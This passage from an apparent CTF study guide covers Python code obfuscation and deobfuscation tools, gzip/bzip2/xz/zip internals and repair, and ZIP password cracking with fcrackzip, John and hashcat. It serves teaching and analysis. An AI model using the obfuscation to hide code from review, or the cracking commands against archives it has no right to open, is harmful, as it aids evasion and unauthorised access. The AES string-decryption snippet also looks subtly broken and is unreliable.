    from Crypto.Util.Padding import pad, unpad
    import hashlib
    
    # Derive key from password
    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
    
    # Encrypt
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    padded = pad(plaintext.encode(), AES.block_size)
    encrypted = cipher.encrypt(padded)
    
    return encrypted

def obfuscate_strings_encrypted(code, encryption_key="secret"):
    """
    Replace strings with AES-encrypted versions
    
    [Unverified: Requires pycryptodome; example demonstrates concept]
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2:
            try:
                encrypted = encrypt_string_aes(content, encryption_key)
                hex_encrypted = encrypted.hex()
                
                # Generate decryption code
                decrypt_code = f"""
(lambda: __import__('Crypto.Cipher.AES').AES.new(
    __import__('hashlib').sha256('{encryption_key}'.encode()).digest()[:16],
    __import__('Crypto.Cipher.AES').MODE_ECB
).decrypt(bytes.fromhex('{hex_encrypted}')))()
"""
                return decrypt_code.strip()
            except ImportError:
                return match.group(0)
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example (will work if pycryptodome is installed)
print("\n=== AES String Obfuscation ===")
try:
    encrypted_code = obfuscate_strings_encrypted("password = 'secret123'", "mykey")
    print(encrypted_code[:200] + "...")
except Exception as e:
    print(f"[Note] Requires pycryptodome: {e}")
```

**Dynamic String Construction**

```python
def obfuscate_strings_dynamic(code):
    """
    Replace strings with dynamic construction expressions
    Makes static analysis harder
    """
    def replace_string(match):
        content = match.group(2)
        
        if len(content) > 3:
            # Split into chunks and concatenate
            chunks = [content[i:i+2] for i in range(0, len(content), 2)]
            concatenated = " + ".join(f"'{chunk}'" for chunk in chunks)
            
            # Add random operations that don't change result
            operations = [
                f"({concatenated})",
                f"(''.join([{', '.join(repr(c) for c in content)}]))",
                f"('{content[0]}' + ''.join([{', '.join(repr(c) for c in content[1:])}]))",
            ]
            
            return random.choice(operations)
        
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example
print("\n=== Dynamic String Construction ===")
print(obfuscate_strings_dynamic("flag = 'CTF{example}'"))
```

### Complete Obfuscation Framework

```python
class CodeObfuscator:
    """
    Comprehensive code obfuscator combining multiple techniques
    """
    
    def __init__(self, code):
        self.original_code = code
        self.obfuscated_code = code
        self.applied_techniques = []
    
    def apply_variable_mangling(self):
        """Apply variable name mangling"""
        result = mangle_variable_names(self.obfuscated_code)
        if result:
            self.obfuscated_code = result['code']
            self.applied_techniques.append('variable_mangling')
        return self
    
    def apply_string_obfuscation(self, method='xor'):
        """Apply string obfuscation"""
        if method == 'xor':
            self.obfuscated_code = obfuscate_strings_xor(self.obfuscated_code)
        elif method == 'base64':
            self.obfuscated_code = obfuscate_strings_base64(self.obfuscated_code)
        elif method == 'charcode':
            self.obfuscated_code = obfuscate_strings_charcode(self.obfuscated_code)
        elif method == 'dynamic':
            self.obfuscated_code = obfuscate_strings_dynamic(self.obfuscated_code)
        
        self.applied_techniques.append(f'string_obfuscation_{method}')
        return self
    
    def apply_control_flow_obfuscation(self, method='flatten'):
        """Apply control flow obfuscation"""
        if method == 'flatten':
            self.obfuscated_code = flatten_control_flow(self.obfuscated_code)
        elif method == 'opaque':
            self.obfuscated_code = add_opaque_predicates(self.obfuscated_code)
        elif method == 'exceptions':
            self.obfuscated_code = obfuscate_with_exceptions(self.obfuscated_code)
        
        self.applied_techniques.append(f'control_flow_{method}')
        return self
    
    def apply_encoding(self, layers=1):
        """Apply base64/zlib encoding layers"""
        for _ in range(layers):
            self.obfuscated_code = obfuscate_python_basic(self.obfuscated_code)
        
        self.applied_techniques.append(f'encoding_{layers}_layers')
        return self
    
    def get_result(self):
        """Get final obfuscated code"""
        return {
            'code': self.obfuscated_code,
            'techniques': self.applied_techniques,
            'original_length': len(self.original_code),
            'obfuscated_length': len(self.obfuscated_code),
            'size_increase': f"{(len(self.obfuscated_code) / len(self.original_code) - 1) * 100:.1f}%"
        }
    
    def save(self, filename):
        """Save obfuscated code to file"""
        with open(filename, 'w') as f:
            f.write(self.obfuscated_code)
        print(f"[+] Saved obfuscated code to {filename}")

# Example usage
original_code = """
def check_flag(user_input):
    correct_flag = "CTF{example_flag_12345}"
    if user_input == correct_flag:
        print("Correct!")
        return True
    else:
        print("Wrong!")
        return False

user_guess = input("Enter flag: ")
result = check_flag(user_guess)
"""

print("=== Complete Obfuscation Pipeline ===\n")
print("Original code:")
print(original_code)
print("\n" + "="*60 + "\n")

# Apply multiple obfuscation techniques
obfuscator = CodeObfuscator(original_code)
result = (obfuscator
    .apply_variable_mangling()
    .apply_string_obfuscation('xor')
    .apply_control_flow_obfuscation('opaque')
    .apply_encoding(layers=1)
    .get_result())

print("Obfuscated code:")
print(result['code'][:500] + "...")
print(f"\nApplied techniques: {', '.join(result['techniques'])}")
print(f"Size increase: {result['size_increase']}")
```

### De-obfuscation Tools and Techniques

**Automated De-obfuscator**

```python
class CodeDeobfuscator:
    """
    Automated deobfuscation tool
    
    [Inference: Uses pattern matching and heuristics]
    """
    
    def __init__(self, obfuscated_code):
        self.code = obfuscated_code
        self.findings = []
        self.decoded_strings = []
    
    def detect_obfuscation_type(self):
        """Detect which obfuscation techniques were used"""
        techniques = []
        
        if 'base64.b64decode' in self.code:
            techniques.append('base64_encoding')
        if 'zlib.decompress' in self.code:
            techniques.append('zlib_compression')
        if 'marshal.loads' in self.code:
            techniques.append('marshal_serialization')
        if '_state' in self.code and 'while' in self.code:
            techniques.append('control_flow_flattening')
        if '_jump_table' in self.code:
            techniques.append('jump_table')
        if 'chr(c^' in self.code:
            techniques.append('xor_encoding')
        if re.search(r'_[0-9A-F]+', self.code):
            techniques.append('variable_mangling')
        
        return techniques
    
    def extract_encoded_data(self):
        """Extract all encoded data"""
        
        # Base64 encoded data
        base64_pattern = r"b64decode\(['\"]([A-Za-z0-9+/=]+)['\"]\)"
        for match in re.finditer(base64_pattern, self.code):
            encoded = match.group(1)
            try:
                decoded = base64.b64decode(encoded)
                self.findings.append({
                    'type': 'base64',
                    'encoded': encoded[:50],
                    'decoded': decoded[:100]
                })
            except:
                pass
        
        # Hex encoded data
        hex_pattern = r"fromhex\(['\"]([0-9a-fA-F]+)['\"]\)"
        for match in re.finditer(hex_pattern, self.code):
            encoded = match.group(1)
            try:
                decoded = bytes.fromhex(encoded)
                self.findings.append({
                    'type': 'hex',
                    'encoded': encoded[:50],
                    'decoded': decoded[:100]
                })
            except:
                pass
        
        # Character arrays
        array_pattern = r"chr\(c\) for c in \[([0-9, ]+)\]"
        for match in re.finditer(array_pattern, self.code):
            arr_str = match.group(1)
            try:
                chars = [int(x) for x in arr_str.split(',')]
                decoded = ''.join(chr(c) for c in chars if 32 <= c <= 126)
                self.findings.append({
                    'type': 'char_array',
                    'encoded': arr_str[:50],
                    'decoded': decoded
                })
            except:
                pass
        
        return self.findings
    
    def try_execute_safe(self, code_snippet, timeout=5):
        """
        Safely execute code snippet to extract strings
        
        [WARNING: This can be dangerous. Only use on trusted/sandboxed code]
        [Inference: Dynamic analysis through controlled execution]
        """
        import io
        import sys
        
        # Redirect stdout
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            # Execute in restricted namespace
            namespace = {
                '__builtins__': {
                    'chr': chr,
                    'ord': ord,
                    'bytes': bytes,
                    'str': str,
                }
            }
            exec(code_snippet, namespace)
            output = captured_output.getvalue()
            return output
        except Exception as e:
            return f"[Error: {e}]"
        finally:
            sys.stdout = old_stdout
    
    def reconstruct_strings(self):
        """Attempt to reconstruct original strings"""
        reconstructed = []
        
        for finding in self.findings:
            if finding['type'] in ['base64', 'hex', 'char_array']:
                try:
                    decoded = finding['decoded']
                    if isinstance(decoded, bytes):
                        decoded = decoded.decode('utf-8', errors='ignore')
                    reconstructed.append(decoded)
                except:
                    pass
        
        return reconstructed
    
    def generate_report(self):
        """Generate deobfuscation report"""
        print("="*60)
        print("DEOBFUSCATION REPORT")
        print("="*60)
        
        techniques = self.detect_obfuscation_type()
        print(f"\nDetected Obfuscation Techniques:")
        for tech in techniques:
            print(f"  • {tech}")
        
        if not techniques:
            print("  [None detected - may be unobfuscated or use unknown methods]")
        
        self.extract_encoded_data()
        
        print(f"\nExtracted Encoded Data: {len(self.findings)}")
        for i, finding in enumerate(self.findings[:10], 1):
            print(f"\n  {i}. Type: {finding['type']}")
            print(f"     Encoded: {finding['encoded']}...")
            
            decoded = finding['decoded']
            if isinstance(decoded, bytes):
                try:
                    decoded = decoded.decode('utf-8', errors='ignore')
                except:
                    decoded = str(decoded)
            
            print(f"     Decoded: {decoded}")
        
        # Look for flags
        all_strings = self.reconstruct_strings()
        flag_pattern = r'CTF\{[^}]+\}'
        flags = []
        
        for string in all_strings:
            matches = re.findall(flag_pattern, string)
            flags.extend(matches)
        
        if flags:
            print(f"\n{'='*60}")
            print(f"🚩 FOUND FLAGS: {len(flags)}")
            print(f"{'='*60}")
            for flag in flags:
                print(f"  {flag}")
        
        return {
            'techniques': techniques,
            'findings': self.findings,
            'flags': flags
        }

# Example usage
obfuscated_sample = """
import base64, zlib, marshal
exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJxLKi5RSEksSVSwtFIoycxNVQgszszPUyjPL8pJAQCMgwm7'))))
s1 = __import__('base64').b64decode('Q1RGe2V4YW1wbGVfZmxhZ30=').decode()
s2 = ''.join(chr(c) for c in [115,101,99,114,101,116])
"""

print("\n=== Automated Deobfuscation ===")
deobf = CodeDeobfuscator(obfuscated_sample)
report = deobf.generate_report()
```

**AST-Based Analysis**

```python
import ast

class ASTAnalyzer(ast.NodeVisitor):
    """
    Analyze Python AST to understand obfuscation
    
    [Inference: Static analysis through abstract syntax tree]
    """
    
    def __init__(self):
        self.exec_calls = []
        self.eval_calls = []
        self.imports = []
        self.suspicious_patterns = []
    
    def visit_Call(self, node):
        """Detect exec() and eval() calls"""
        if isinstance(node.func, ast.Name):
            if node.func.id == 'exec':
                self.exec_calls.append(ast.unparse(node) if hasattr(ast, 'unparse') else 'exec(...)')
            elif node.func.id == 'eval':
                self.eval_calls.append(ast.unparse(node) if hasattr(ast, 'unparse') else 'eval(...)')
        
        self.generic_visit(node)
    
    def visit_Import(self, node):
        """Track imports"""
        for alias in node.names:
            self.imports.append(alias.name)
        self.generic_visit(node)
    
    def visit_ImportFrom(self, node):
        """Track from X import Y"""
        module = node.module or ''
        for alias in node.names:
            self.imports.append(f"{module}.{alias.name}")
        self.generic_visit(node)
    
    def analyze(self, code):
        """Analyze code and generate report"""
        try:
            tree = ast.parse(code)
            self.visit(tree)
            
            print("=== AST Analysis Report ===\n")
            
            if self.exec_calls:
                print(f"[!] Found {len(self.exec_calls)} exec() calls:")
                for call in self.exec_calls[:5]:
                    print(f"    {call[:80]}...")
            
            if self.eval_calls:
                print(f"[!] Found {len(self.eval_calls)} eval() calls:")
                for call in self.eval_calls[:5]:
                    print(f"    {call[:80]}...")
            
            if self.imports:
                print(f"\n[+] Imports detected:")
                suspicious = ['marshal', 'base64', 'zlib', 'pickle']
                for imp in self.imports:
                    marker = " [SUSPICIOUS]" if any(s in imp for s in suspicious) else ""
                    print(f"    {imp}{marker}")
            
            # Suspicion score
            score = len(self.exec_calls) * 3 + len(self.eval_calls) * 3
            score += sum(3 for imp in self.imports if any(s in imp for s in ['marshal', 'pickle']))
            score += sum(1 for imp in self.imports if any(s in imp for s in ['base64', 'zlib']))
            
            print(f"\nSuspicion Score: {score}/100")
            if score > 10:
                print("[WARNING] Highly suspicious code - likely obfuscated")
            elif score > 5:
                print("[CAUTION] Some suspicious patterns detected")
            else:
                print("[OK] No major red flags")
                
        except SyntaxError as e:
            print(f"[Error] Cannot parse code: {e}")

# Example
analyzer = ASTAnalyzer()
analyzer.analyze(obfuscated_sample)
```

**CTF Challenge: Deobfuscation Exercise**

```python
def create_obfuscation_challenge():
    """
    Create a CTF-style obfuscation challenge
    """
    flag = "CTF{d30bfusc4t10n_m4st3r}"
    
    # Hidden flag with multiple obfuscation layers
    obfuscated = f"""
import base64 as _b, zlib as _z
_x = lambda s: ''.join(chr(ord(c)^0x42) for c in s)
_y = _b.b64decode
_data = _y(b'{base64.b64encode(zlib.compress(_x(flag).encode())).decode()}')
_flag = _x(_z.decompress(_data).decode())

def _check(_input):
    return _input == _flag

# Can you find the flag?
if __name__ == '__main__':
    guess = input("Enter flag: ")
    if _check(guess):
        print("Correct!")
    else:
        print("Try again!")
"""
    
    return obfuscated

print("\n=== CTF Obfuscation Challenge ===")
challenge = create_obfuscation_challenge()
print(challenge)

print("\n=== Solution Walkthrough ===")
print("1. Identify obfuscation layers:")
print("   - XOR with key 0x42")
print("   - Base64 encoding")
print("   - Zlib compression")
print("\n2. Reverse the operations:")
print("   - Base64 decode")
print("   - Zlib decompress")
print("   - XOR with 0x42")
print("\n3. Extract the flag using automated tool:")

deobf_challenge = CodeDeobfuscator(challenge)
deobf_challenge.generate_report()
```

---

**Important Related Topics:**

- Binary obfuscation techniques (packers, protectors, anti-debugging)
- JavaScript obfuscation and deobfuscation tools (JSFuck, JSObfuscator)
- Code virtualization and VM-based protection
- Anti-forensics and anti-reverse engineering techniques
- Symbolic execution for deobfuscation (angr, Triton)
- Machine learning approaches to deobfuscation

---

## Compression

### Overview and Cryptanalytic Context

Compression algorithms reduce data size by exploiting redundancy and patterns. In CTF contexts, compression is relevant for:

- **Archive manipulation and extraction** (password recovery, header repair)
- **Compression-based cryptanalysis** (exploiting information leakage)
- **Steganography detection** (entropy anomalies in compressed data)
- **Known-plaintext attacks** (compression ratios reveal information)

**Core compression principles:**

- **Lossless compression**: Perfect reconstruction of original data
- **Dictionary-based**: Replace repeated patterns with references (LZ77, LZ78)
- **Statistical coding**: Encode frequent symbols with fewer bits (Huffman, arithmetic coding)
- **Entropy**: Theoretical compression limit based on data randomness

### GZIP, BZIP2, LZMA

These are common Unix compression utilities with different algorithms and use cases.

#### GZIP (GNU ZIP)

GZIP uses DEFLATE algorithm (LZ77 + Huffman coding). Fast compression/decompression, moderate compression ratio.

**File structure:**

```
Header (10 bytes minimum):
  - Magic: 0x1f 0x8b
  - Compression method: 0x08 (DEFLATE)
  - Flags: extra fields, filename, comment, CRC
  - Timestamp (4 bytes)
  - Extra flags
  - OS identifier

Compressed data blocks

Footer (8 bytes):
  - CRC32 of uncompressed data
  - Size of uncompressed data (modulo 2^32)
```

**Basic operations:**

```bash
# Compression
gzip file.txt              # Creates file.txt.gz, removes original
gzip -c file.txt > file.gz # Keep original
gzip -9 file.txt           # Maximum compression (slower)
gzip -1 file.txt           # Fastest compression

# Decompression
gunzip file.txt.gz
gzip -d file.txt.gz
zcat file.txt.gz           # Decompress to stdout

# Inspection
file file.gz               # Identify format
zcat file.gz | head        # Preview contents
gzip -l file.gz            # List compressed/uncompressed size

# Force decompression (ignore corruption)
gzip -d -f file.gz
```

**Analyzing GZIP structure:**

```python
#!/usr/bin/env python3
import struct
import zlib
import binascii

def analyze_gzip(filepath):
    """
    Parse and analyze GZIP file structure
    """
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("GZIP FILE ANALYSIS")
    print("=" * 60)
    
    # Check magic number
    if len(data) < 10:
        print("[!] File too small to be valid GZIP")
        return
    
    magic = data[0:2]
    if magic != b'\x1f\x8b':
        print(f"[!] Invalid magic number: {magic.hex()}")
        return
    
    print(f"[+] Valid GZIP magic: {magic.hex()}")
    
    # Parse header
    compression_method = data[2]
    flags = data[3]
    mtime = struct.unpack('<I', data[4:8])[0]
    xfl = data[8]
    os = data[9]
    
    print(f"\nHeader Information:")
    print(f"  Compression method: {compression_method} (8 = DEFLATE)")
    print(f"  Flags: 0x{flags:02x}")
    print(f"    FTEXT:    {bool(flags & 0x01)}")
    print(f"    FHCRC:    {bool(flags & 0x02)}")
    print(f"    FEXTRA:   {bool(flags & 0x04)}")
    print(f"    FNAME:    {bool(flags & 0x08)}")
    print(f"    FCOMMENT: {bool(flags & 0x10)}")
    print(f"  Timestamp: {mtime}")
    print(f"  Extra flags: 0x{xfl:02x}")
    print(f"  OS: {os}")
    
    # Parse optional fields
    offset = 10
    
    if flags & 0x04:  # FEXTRA
        xlen = struct.unpack('<H', data[offset:offset+2])[0]
        print(f"\nExtra field length: {xlen} bytes")
        offset += 2 + xlen
    
    if flags & 0x08:  # FNAME
        fname_end = data.index(b'\x00', offset)
        fname = data[offset:fname_end].decode('latin-1', errors='ignore')
        print(f"\nOriginal filename: {fname}")
        offset = fname_end + 1
    
    if flags & 0x10:  # FCOMMENT
        comment_end = data.index(b'\x00', offset)
        comment = data[offset:comment_end].decode('latin-1', errors='ignore')
        print(f"\nComment: {comment}")
        offset = comment_end + 1
    
    if flags & 0x02:  # FHCRC
        header_crc = struct.unpack('<H', data[offset:offset+2])[0]
        print(f"\nHeader CRC16: 0x{header_crc:04x}")
        offset += 2
    
    # Footer (last 8 bytes)
    if len(data) >= 8:
        footer_crc32 = struct.unpack('<I', data[-8:-4])[0]
        uncompressed_size = struct.unpack('<I', data[-4:])[0]
        
        print(f"\nFooter Information:")
        print(f"  CRC32: 0x{footer_crc32:08x}")
        print(f"  Uncompressed size: {uncompressed_size} bytes (mod 2^32)")
    
    # Attempt decompression
    print(f"\nDecompression Attempt:")
    compressed_data = data[offset:-8]
    
    try:
        # DEFLATE decompression (raw, no gzip wrapper)
        decompressed = zlib.decompress(compressed_data, -zlib.MAX_WBITS)
        print(f"  [+] Successfully decompressed: {len(decompressed)} bytes")
        
        # Verify CRC32
        calculated_crc = zlib.crc32(decompressed) & 0xffffffff
        if calculated_crc == footer_crc32:
            print(f"  [+] CRC32 verified")
        else:
            print(f"  [!] CRC32 mismatch: expected 0x{footer_crc32:08x}, got 0x{calculated_crc:08x}")
        
        # Show preview
        preview = decompressed[:200].decode('utf-8', errors='ignore')
        print(f"\nContent preview:")
        print(f"  {preview[:100]}...")
        
    except zlib.error as e:
        print(f"  [!] Decompression failed: {e}")

# Example usage
# analyze_gzip('file.gz')
```

**GZIP manipulation and repair:**

```python
#!/usr/bin/env python3

def repair_gzip_header(data):
    """
    Attempt to repair corrupted GZIP header
    Common CTF scenario: header bytes modified
    """
    print("Attempting GZIP header repair...")
    
    # Fix magic number
    if data[0:2] != b'\x1f\x8b':
        print(f"  [*] Fixing magic number: {data[0:2].hex()} → 1f8b")
        data = b'\x1f\x8b' + data[2:]
    
    # Ensure compression method is DEFLATE
    if data[2] != 0x08:
        print(f"  [*] Setting compression method to DEFLATE")
        data = data[0:2] + b'\x08' + data[3:]
    
    return data

def extract_gzip_data(filepath, output_path):
    """Extract data even from partially corrupted GZIP"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    # Try standard decompression first
    try:
        with gzip.open(filepath, 'rb') as f:
            decompressed = f.read()
        print("[+] Standard decompression successful")
        return decompressed
    except:
        pass
    
    # Try repairing header
    repaired = repair_gzip_header(data)
    
    # Manual decompression
    try:
        # Skip to compressed data (after variable-length header)
        offset = 10
        flags = data[3] if len(data) > 3 else 0
        
        if flags & 0x04:  # FEXTRA
            xlen = struct.unpack('<H', data[offset:offset+2])[0]
            offset += 2 + xlen
        
        if flags & 0x08:  # FNAME
            offset = data.index(b'\x00', offset) + 1
        
        if flags & 0x10:  # FCOMMENT
            offset = data.index(b'\x00', offset) + 1
        
        if flags & 0x02:  # FHCRC
            offset += 2
        
        compressed = data[offset:-8]
        decompressed = zlib.decompress(compressed, -zlib.MAX_WBITS)
        
        print(f"[+] Manual decompression successful: {len(decompressed)} bytes")
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(decompressed)
        
        return decompressed
        
    except Exception as e:
        print(f"[!] Decompression failed: {e}")
        return None
```

#### BZIP2

BZIP2 uses Burrows-Wheeler Transform (BWT) + Move-To-Front + Huffman coding. Better compression than GZIP for text, slower.

**File structure:**

```
Header: "BZh" + block size (1-9)
Blocks: Multiple compressed blocks
Footer: CRC32 + end marker
```

**Basic operations:**

```bash
# Compression
bzip2 file.txt             # Creates file.txt.bz2
bzip2 -9 file.txt          # Maximum compression (default)
bzip2 -1 file.txt          # Fastest

# Decompression
bunzip2 file.txt.bz2
bzip2 -d file.txt.bz2
bzcat file.txt.bz2         # To stdout

# Inspection
file file.bz2
bzcat file.bz2 | head

# Test integrity
bzip2 -t file.bz2

# Recover from errors
bzip2recover file.bz2      # Attempts to recover blocks
```

**BZIP2 analysis:**

```python
#!/usr/bin/env python3
import bz2

def analyze_bzip2(filepath):
    """Parse BZIP2 file structure"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("BZIP2 FILE ANALYSIS")
    print("=" * 60)
    
    # Check magic
    if not data.startswith(b'BZh'):
        print(f"[!] Invalid BZIP2 magic: {data[:3]}")
        return
    
    print(f"[+] Valid BZIP2 magic: {data[:3].decode()}")
    
    # Block size (1-9)
    if len(data) > 3:
        block_size_char = chr(data[3])
        if block_size_char.isdigit():
            block_size = int(block_size_char) * 100000
            print(f"  Block size: {block_size_char} ({block_size} bytes)")
    
    # Attempt decompression
    try:
        decompressed = bz2.decompress(data)
        print(f"\n[+] Decompression successful: {len(decompressed)} bytes")
        print(f"  Compression ratio: {len(data) / len(decompressed):.2f}")
        
        # Preview
        preview = decompressed[:200].decode('utf-8', errors='ignore')
        print(f"\nContent preview:\n  {preview[:100]}...")
        
    except Exception as e:
        print(f"\n[!] Decompression failed: {e}")

# analyze_bzip2('file.bz2')
```

**BZIP2 block recovery:**

```bash
#!/bin/bash
# Recover individual blocks from corrupted BZIP2

bzip2recover corrupted.bz2

# Creates: rec00001corrupted.bz2, rec00002corrupted.bz2, etc.
# Each recoverable block becomes separate file

for block in rec*corrupted.bz2; do
    echo "Extracting $block..."
    bunzip2 "$block" 2>/dev/null && echo "Success" || echo "Failed"
done
```

#### LZMA / XZ

LZMA (Lempel-Ziv-Markov chain Algorithm) offers best compression ratio, slowest speed. XZ is the modern container format for LZMA2.

**File structure (XZ):**

```
Header: Magic 0xFD 0x37 0x7A 0x58 0x5A 0x00 ("ý7zXZ\0")
Stream flags
Blocks with LZMA2 data
Index
Footer
```

**Basic operations:**

```bash
# Compression (XZ/LZMA)
xz file.txt                # Creates file.txt.xz
xz -9 file.txt             # Maximum compression
xz -e file.txt             # Extreme mode (slower, better ratio)

# Legacy LZMA format
lzma file.txt              # Creates file.txt.lzma

# Decompression
unxz file.txt.xz
xz -d file.txt.xz
xzcat file.txt.xz          # To stdout

# Inspection
file file.xz
xz -l file.xz              # List compressed file info
xzcat file.xz | head

# Test integrity
xz -t file.xz

# Multi-threaded compression (faster)
xz -T4 file.txt            # 4 threads
```

**XZ/LZMA analysis:**

```python
#!/usr/bin/env python3
import lzma

def analyze_xz(filepath):
    """Parse XZ/LZMA file structure"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("XZ/LZMA FILE ANALYSIS")
    print("=" * 60)
    
    # Check XZ magic
    if data.startswith(b'\xfd7zXZ\x00'):
        print("[+] XZ format detected")
        format_type = "XZ"
    elif data.startswith(b'\x5d\x00\x00'):
        print("[+] Legacy LZMA format detected")
        format_type = "LZMA"
    else:
        print(f"[!] Unknown format, magic: {data[:6].hex()}")
        return
    
    # Attempt decompression
    try:
        decompressed = lzma.decompress(data)
        print(f"\n[+] Decompression successful: {len(decompressed)} bytes")
        print(f"  Compression ratio: {len(data) / len(decompressed):.2f}")
        
        # Preview
        preview = decompressed[:200].decode('utf-8', errors='ignore')
        print(f"\nContent preview:\n  {preview[:100]}...")
        
    except Exception as e:
        print(f"\n[!] Decompression failed: {e}")

# analyze_xz('file.xz')
```

**Compression comparison:**

```bash
#!/bin/bash
# Compare compression algorithms

FILE="testfile.txt"

echo "Comparing compression methods on $FILE"
echo "Original size: $(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE") bytes"
echo

# GZIP
gzip -c -9 "$FILE" > test.gz
echo "GZIP:  $(stat -f%z test.gz 2>/dev/null || stat -c%s test.gz) bytes ($(echo "scale=2; $(stat -f%z test.gz 2>/dev/null || stat -c%s test.gz)*100/$(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE")" | bc)%)"

# BZIP2
bzip2 -c -9 "$FILE" > test.bz2
echo "BZIP2: $(stat -f%z test.bz2 2>/dev/null || stat -c%s test.bz2) bytes ($(echo "scale=2; $(stat -f%z test.bz2 2>/dev/null || stat -c%s test.bz2)*100/$(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE")" | bc)%)"

# XZ
xz -c -9 "$FILE" > test.xz
echo "XZ:    $(stat -f%z test.xz 2>/dev/null || stat -c%s test.xz) bytes ($(echo "scale=2; $(stat -f%z test.xz 2>/dev/null || stat -c%s test.xz)*100/$(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE")" | bc)%)"

# Cleanup
rm test.gz test.bz2 test.xz
```

### ZIP, RAR, 7z Compression

Archive formats that combine multiple files with compression and optional encryption.

#### ZIP Format

ZIP is the most common archive format with wide tool support.

**File structure:**

```
Local file headers + compressed data (for each file)
Central directory (index of all files)
End of central directory record
```

**Basic operations:**

```bash
# Creation
zip archive.zip file1.txt file2.txt
zip -r archive.zip directory/        # Recursive
zip -9 archive.zip file.txt          # Maximum compression
zip -e archive.zip file.txt          # Encrypt with password
zip -P password archive.zip file.txt # Password on command line

# Extraction
unzip archive.zip
unzip -d output_dir archive.zip
unzip -l archive.zip                 # List contents
unzip -t archive.zip                 # Test integrity

# Inspection
zipinfo archive.zip
zipinfo -v archive.zip               # Verbose
file archive.zip

# Partial extraction
unzip archive.zip specific_file.txt
unzip archive.zip "*.txt"            # Pattern matching
```

**ZIP structure analysis:**

```python
#!/usr/bin/env python3
import zipfile
import struct

def analyze_zip_detailed(filepath):
    """
    Detailed ZIP file analysis including header inspection
    """
    print("=" * 60)
    print("ZIP FILE DETAILED ANALYSIS")
    print("=" * 60)
    
    with open(filepath, 'rb') as f:
        data = f.read()
    
    # Find local file headers (signature: 0x04034b50)
    offset = 0
    file_count = 0
    
    while offset < len(data) - 4:
        sig = struct.unpack('<I', data[offset:offset+4])[0]
        
        if sig == 0x04034b50:  # Local file header
            file_count += 1
            print(f"\nLocal File Header #{file_count} at offset 0x{offset:x}")
            
            # Parse header
            version = struct.unpack('<H', data[offset+4:offset+6])[0]
            flags = struct.unpack('<H', data[offset+6:offset+8])[0]
            method = struct.unpack('<H', data[offset+8:offset+10])[0]
            mod_time = struct.unpack('<H', data[offset+10:offset+12])[0]
            mod_date = struct.unpack('<H', data[offset+12:offset+14])[0]
            crc32 = struct.unpack('<I', data[offset+14:offset+18])[0]
            comp_size = struct.unpack('<I', data[offset+18:offset+22])[0]
            uncomp_size = struct.unpack('<I', data[offset+22:offset+26])[0]
            name_len = struct.unpack('<H', data[offset+26:offset+28])[0]
            extra_len = struct.unpack('<H', data[offset+28:offset+30])[0]
            
            # Filename
            filename = data[offset+30:offset+30+name_len].decode('utf-8', errors='ignore')
            
            print(f"  Filename: {filename}")
            print(f"  Version: {version}")
            print(f"  Flags: 0x{flags:04x}")
            print(f"    Encrypted: {bool(flags & 0x01)}")
            print(f"    Data descriptor: {bool(flags & 0x08)}")
            print(f"  Compression method: {method}", end="")
            
            methods = {0: "Stored", 8: "DEFLATE", 12: "BZIP2", 14: "LZMA", 95: "XZ", 96: "JPEG", 97: "WavPack", 98: "PPMd"}
            print(f" ({methods.get(method, 'Unknown')})")
            
            print(f"  CRC32: 0x{crc32:08x}")
            print(f"  Compressed size: {comp_size} bytes")
            print(f"  Uncompressed size: {uncomp_size} bytes")
            print(f"  Compression ratio: {(comp_size/uncomp_size*100):.1f}%" if uncomp_size > 0 else "N/A")
            
            offset += 30 + name_len + extra_len + comp_size
        
        elif sig == 0x02014b50:  # Central directory header
            print(f"\nCentral Directory at offset 0x{offset:x}")
            break
        
        else:
            offset += 1
    
    # Use zipfile module for additional info
    try:
        with zipfile.ZipFile(filepath, 'r') as zf:
            print(f"\n" + "=" * 60)
            print("ZIPFILE MODULE ANALYSIS")
            print("=" * 60)
            
            for info in zf.infolist():
                print(f"\n{info.filename}:")
                print(f"  Compressed: {info.compress_size} bytes")
                print(f"  Uncompressed: {info.file_size} bytes")
                print(f"  Compression type: {info.compress_type}")
                print(f"  Modified: {info.date_time}")
                print(f"  CRC: 0x{info.CRC:08x}")
                
                # Check for encryption
                if info.flag_bits & 0x01:
                    print(f"  [!] ENCRYPTED")
                
                # Check for unusual features
                if info.compress_type not in [0, 8]:
                    print(f"  [!] Unusual compression method: {info.compress_type}")
    
    except Exception as e:
        print(f"\n[!] ZipFile module error: {e}")

# analyze_zip_detailed('archive.zip')
```

**ZIP password cracking:**

```bash
# fcrackzip - Fast ZIP password cracker
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt archive.zip
fcrackzip -b -c aA1 -l 1-8 archive.zip  # Brute force, alphanumeric, 1-8 chars

# John the Ripper
zip2john archive.zip > hash.txt
john hash.txt --wordlist=rockyou.txt

# Hashcat (mode 13600 for WinZip, 17200 for PKZIP)
hashcat -m 17200 -a 0 hash.txt rockyou.txt
```

**Known-plaintext attack on ZIP (legacy encryption):**

```python
#!/usr/bin/env python3
import zipfile

def zip_known_plaintext_attack(encrypted_zip, known_plaintext_file, output_zip):
    """
    Attack weak ZIP encryption using known plaintext
    Works on legacy ZipCrypto (not AES)
    
    [Inference] Requires at least 12 bytes of known plaintext
    [Unverified] Success depends on encryption method
    """
    print("ZIP Known-Plaintext Attack")
    print("=" * 60)
    
    # Read encrypted archive
    with zipfile.ZipFile(encrypted_zip, 'r') as zf:
        file_list = zf.namelist()
        print(f"Files in archive: {file_list}")
        
